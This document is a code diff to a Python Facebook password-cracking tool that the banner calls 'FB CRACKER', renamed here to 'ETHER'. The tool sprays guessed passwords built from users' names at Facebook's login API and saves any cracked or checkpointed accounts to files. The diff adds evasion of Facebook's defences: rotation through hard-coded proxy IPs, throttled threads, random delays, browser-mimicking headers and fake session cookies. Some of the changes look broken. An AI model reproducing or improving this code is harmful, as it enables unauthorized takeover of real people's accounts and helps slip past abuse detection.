@@ -101,6 +101,17 @@ header = {
 randomgents = random.choice(agents)
 		
 headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': randomgents, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+
+# Enhancement 2: Proxy list (add your proxies here if you have them)
+proxies_list = [
+    # Add your proxies here like:
+    {'http': 'http://156.38.112.11:80', 'https': 'https://156.38.112.11:80'},
+    {'http': 'http://197.255.126.69:80', 'https': 'https://197.255.126.69:80'},
+    {'http': 'http://41.74.91.244:80', 'https': 'https://41.74.91.244:80'},
+    {'http': 'http://102.90.93.170:8080', 'https': 'https://102.90.93.170:8080'},
+    {'http': 'http://197.211.45.4:10000', 'https': 'https://197.211.45.4:10000'},
+    {'http': 'http://41.216.160.138:8082', 'https': 'https://41.216.160.138:8082'},
+]
 			
 user_agent = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", 
@@ -112,7 +123,7 @@ def linex():
     os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
 
 def logo():
-   os.system('echo "\n\t ╔═══╗╔═══╗╔═══╗╔═╗╔═╗ \n\t ╚╗╔╗║║╔═╗║║╔══╝╚╗╚╝╔╝ \n\t  ║║║║║╚═╝║║╚══╗ ╚╗╔╝  \n\t  ║║║║║╔╗╔╝║╔══╝ ╔╝╚╗  \n\t ╔╝╚╝║║║║╚╗║╚══╗╔╝╔╗╚╗ \n\t ╚═══╝╚╝╚═╝╚═══╝╚═╝╚═╝ \n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { FB CRACKER }   ║\n    ║ AUTHOR   : Chidexzy         ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
+   os.system('echo "\n\t ╔═══╗╔═══╗╔═══╗╔═╗╔═╗ \n\t ╚╗╔╗║║╔═╗║║╔══╝╚╗╚╝╔╝ \n\t  ║║║║║╚═╝║║╚══╗ ╚╗╔╝  \n\t  ║║║║║╔╗╔╝║╔══╝ ╔╝╚╗  \n\t ╔╝╚╝║║║║╚╗║╚══╗╔╝╔╗╚╗ \n\t ╚═══╝╚╝╚═╝╚═══╝╚═╝╚═╝ \n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: {    ETHER   }   ║\n    ║ AUTHOR   : Chidexzy         ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
 
 def main():
     os.system("clear")
@@ -194,7 +205,8 @@ def files():
     for i in range(ps_limit):
         plist.append(input(f' Put password {i+1}: '))
     
-    with tred(25) as crack_submit:
+    # Enhancement 5: Reduced concurrent threads from 25 to 5
+    with tred(5) as crack_submit:
         os.system('clear')
         logo()
         total_ids = str(len(fo))
@@ -217,12 +229,37 @@ def files():
 
 def ffb(ids, names, passlist):
     global loop, oks, cps, okc, cpc
+    
+    # Enhancement 7: Random initial delay for each thread
+    initial_delay = random.uniform(0, 5)
+    time.sleep(initial_delay)
+    
     loop += 1
     sys.stdout.write('\r\x1b[1;97m[\033[1;97mCracking\033[1;97m] %s |\x1b[1;92mOK:- %s \x1b[1;97m\r'%(loop,len(oks)))
     sys.stdout.flush()
     vaugent = random.choice(agents)
     session = requests.Session()
-    session.headers.update({'User-Agent': vaugent})
+    
+    # Enhanced headers to avoid detection
+    session.headers.update({
+        'User-Agent': vaugent,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none'
+    })
+    
+    # Enhancement 4: Add session cookies to look more realistic
+    session.cookies.update({
+        'locale': 'en_US',
+        'datr': f'random_datr_{random.randint(100000, 999999)}',
+        'sb': f'random_sb_{random.randint(100000, 999999)}'
+    })
+    
     try:
         first = names.split(' ')[0]
         try:
@@ -233,24 +270,31 @@ def ffb(ids, names, passlist):
         ps2 = last.lower()
         for fikr in passlist:
             pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-            data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+ids+"&password="+pas+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
-            q = json.loads(data)
-            if "access_token" in q and "EAAA" in q:
-                print(" \033[1;32m[EXCELLENT] "+ids+" | "+pas+"\033[0;97m")
+            
+            # Enhancement 2: Proxy rotation (if you have proxies)
+            proxy = random.choice(proxies_list)
+            url = f"https://b-api.facebook.com/method/auth.login?format=json&email={ids}&password={pas}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+            
+            data = session.get(url, headers=headers_, proxies=proxy)
+            q = json.loads(data.text)
+            
+            if "c_user" in json.dumps(q).lower():
+                print(" \033[1;32m[EXCELLENT] "+ids+" | "+pas+" | "+proxy+"\033[0;97m")
                 okc+=1
                 ok = open("/storage/emulated/0/ether_ok.txt", "a")
                 ok.write(ids+"|"+pas+"\n")
                 ok.close()
                 oks.append(ids+pas)
+                break  # Exit on success
             else:
-                if "www.facebook.com" in q['error_msg']:
-                    print("\r \033[1;33m[CHECKPOINT] "+ids+" | "+pas+"\033[0;97m")
+                if "verify" in json.dumps(q).lower():
+                    print("\r \033[1;33m[CHECKPOINT] "+ids+" | "+pas+" | "+proxy+"\033[0;97m")
                     cpc+=1
                     cp = open("/storage/emulated/0/ether_cp.txt", "a")
-                    cp.write(ids+"|"+pas+"\n")
+                    cp.write(ids+"|"+pas+"|"+proxy+"\n")
                     cp.close()
                     cps.append(ids+pas)
-            pass
+                    break  # Exit on checkpoint
     except Exception as e:
         pass
 
